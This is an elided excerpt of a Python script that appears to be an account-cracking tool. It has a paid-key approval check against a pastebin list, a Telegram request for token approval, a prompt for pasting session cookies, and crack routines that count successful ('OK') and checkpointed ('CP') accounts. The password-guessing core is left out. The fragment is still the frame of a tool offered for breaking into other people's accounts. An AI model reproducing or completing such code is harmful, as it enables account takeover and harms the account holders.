...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://pastebin.com/raw/ac5su4bt').text
    if id in httpCaht:
      print("\033[1;92mYour KEY is successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      login()
      pass
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://t.me/shadowmicron588?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] Past Cookies : ')
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# PLEASE USE THIS TOOLS WISELY '
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%sCICADA %s/%s OK:%s CP:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%sENGINE-START %s/%s Ok*%s CP *%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
